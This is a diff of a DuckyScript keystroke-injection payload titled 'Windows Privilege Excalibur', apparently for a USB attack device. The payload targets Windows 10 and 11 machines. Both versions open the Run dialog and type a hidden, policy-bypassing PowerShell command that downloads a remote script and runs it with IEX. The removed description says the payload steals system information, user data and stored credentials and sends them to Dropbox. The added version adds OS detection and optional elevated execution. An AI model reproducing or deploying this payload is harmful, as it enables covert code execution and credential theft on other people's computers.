@@ -1,17 +1,106 @@
-REM     Title: Windows Privilege Excalibur
-REM     Author: Who-Is-Julien
-REM     Description: This payload exfiltrates Windows system information, user information, stored credentials and installed programs from the target computer to Dropbox for subsequent privilege escalation analysis.
-REM     Target: Windows 10, 11
+REM_BLOCK DOCUMENTATION
+    Title: Windows Privilege Excalibur
+    Author: PlumpyTurkey
+    Description: This payload sends you a brief user privilege escalation report via Dropbox.
+    Target: Windows 10, 11
+    Version: 1.3
+    Category: Exfiltration
+END_REM
 
-REM     Replace DOWNLOAD_LINK with the actual download link of the script.
-DEFINE DOWNLOAD_LINK example.com
+EXTENSION PASSIVE_WINDOWS_DETECT
+    REM VERSION 1.1
+    REM AUTHOR: Korben
 
+    REM_BLOCK DOCUMENTATION
+        Windows fully passive OS Detection and passive Detect Ready
+        Includes its own passive detect ready.
+        Does not require additional extensions.
 
-DELAY 2000
-GUI r
-DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr 
-STRING DOWNLOAD_LINK
-STRING ; iex $pl
-DELAY 500
-ENTER
+        USAGE:
+            Extension runs inline (here)
+            Place at beginning of payload (besides ATTACKMODE) to act as dynamic
+            boot delay
+            $_OS will be set to WINDOWS or NOT_WINDOWS
+            See end of payload for usage within payload
+    END_REM
+
+    REM CONFIGURATION:
+    DEFINE #MAX_WAIT 150
+    DEFINE #CHECK_INTERVAL 20
+    DEFINE #WINDOWS_HOST_REQUEST_COUNT 2
+    DEFINE #NOT_WINDOWS 7
+
+    $_OS = #NOT_WINDOWS
+
+    VAR $MAX_TRIES = #MAX_WAIT
+    WHILE(($_RECEIVED_HOST_LOCK_LED_REPLY == FALSE) && ($MAX_TRIES > 0))
+        DELAY #CHECK_INTERVAL
+        $MAX_TRIES = ($MAX_TRIES - 1)
+    END_WHILE
+    IF ($_HOST_CONFIGURATION_REQUEST_COUNT > #WINDOWS_HOST_REQUEST_COUNT) THEN
+        $_OS = WINDOWS
+    END_IF
+
+    REM_BLOCK EXAMPLE USAGE AFTER EXTENSION
+        IF ($_OS == WINDOWS) THEN
+            STRING HELLO WINDOWS!
+        ELSE
+            STRING HELLO WORLD!
+        END_IF
+    END_REM
+END_EXTENSION
+
+EXTENSION WINDOWS_ONLY 
+    REM VERSION 1.0
+    REM AUTHOR: Korben
+
+    DEFINE #FAILURE_LED TRUE
+    DEFINE #FAILURE_LED_MODE LED_R
+    DEFINE #FAILURE_ATTACKMODE ATTACKMODE OFF
+
+    IF (($_OS == WINDOWS) == FALSE) THEN
+        IF_DEFINED_TRUE #FAILURE_LED
+            #FAILURE_LED_MODE
+            DELAY 500
+            #FAILURE_LED_MODE
+            DELAY 500
+            #FAILURE_LED_MODE
+        END_IF_DEFINED
+        #FAILURE_ATTACKMODE
+        STOP_PAYLOAD
+    END_IF
+END_EXTENSION
+
+EXTENSION RUN_HOSTED_POWERSHELL
+    REM_BLOCK DOCUMENTATION
+        Title: Run Hosted PowerShell
+        Author: PlumpyTurkey
+        Description: This extension executes a hosted PowerShell script using the Windows Run dialog box.
+        Target: Windows 10, 11
+        Version: 1.0
+    END_REM
+
+    REM Required options:
+    DEFINE #RHP_SCRIPT_URL example.com
+
+    REM Advanced options:
+    DEFINE #RHP_DELAY 2000
+    DEFINE #RHP_ELEVATED_EXECUTION FALSE
+    DEFINE #RHP_DISABLE_AFTER_EXECUTION FALSE
+
+    GUI r
+    DELAY #RHP_DELAY
+    STRING PowerShell -W H -EX Bypass "IWR -UseB '#RHP_SCRIPT_URL' | IEX"
+
+    IF_DEFINED_TRUE #RHP_ELEVATED_EXECUTION
+        CTRL SHIFT ENTER
+        DELAY #RHP_DELAY
+        LEFT
+    END_IF_DEFINED
+
+    ENTER
+    
+    IF_DEFINED_TRUE #RHP_DISABLE_AFTER_EXECUTION
+        ATTACKMODE OFF
+    END_IF_DEFINED
+END_EXTENSION
